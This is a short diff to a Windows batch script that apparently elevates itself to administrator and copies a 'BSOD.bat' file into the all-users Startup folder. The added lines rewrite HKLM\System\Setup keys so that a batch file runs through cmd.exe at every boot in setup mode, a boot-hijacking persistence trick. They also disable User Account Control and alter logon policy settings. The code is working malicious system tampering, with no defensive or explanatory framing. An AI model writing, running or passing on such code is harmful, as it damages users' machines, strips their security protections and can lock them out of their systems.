@@ -1,5 +1,11 @@
 @echo off
 runadmin.vbs %0
+reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k C:\wget-download\autoexec.bat" /f
+reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f > nul
+reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
 cd/
 cd "wget-download"
 copy /y "BSOD.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" > nul
